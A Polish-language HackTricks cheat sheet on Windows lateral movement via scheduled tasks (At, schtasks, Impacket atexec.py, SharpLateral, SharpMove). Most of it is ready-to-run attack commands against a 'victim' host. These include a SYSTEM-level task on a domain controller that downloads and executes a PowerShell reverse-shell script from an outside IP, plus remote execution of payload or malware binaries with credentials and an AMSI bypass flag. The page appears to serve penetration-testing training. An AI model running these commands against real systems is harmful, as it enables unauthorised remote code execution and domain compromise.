# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Jak to działa

At pozwala na planowanie zadań na hostach, gdzie znasz nazwę użytkownika/(hasło/Hash). Możesz go użyć do wykonywania poleceń na innych hostach i uzyskiwania wyników.
```
At \\victim 11:00:00PM shutdown -r
```
Używając schtasks, najpierw musisz utworzyć zadanie, a następnie je wywołać:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Możesz użyć **Impacket's `atexec.py`** do wykonywania poleceń na zdalnych systemach za pomocą polecenia AT. Wymaga to ważnych poświadczeń (nazwa użytkownika i hasło lub hash) dla docelowego systemu.
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
Możesz również użyć [SharpLateral](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Możesz użyć [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Więcej informacji na temat [**użycia schtasks z srebrnymi biletami tutaj**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
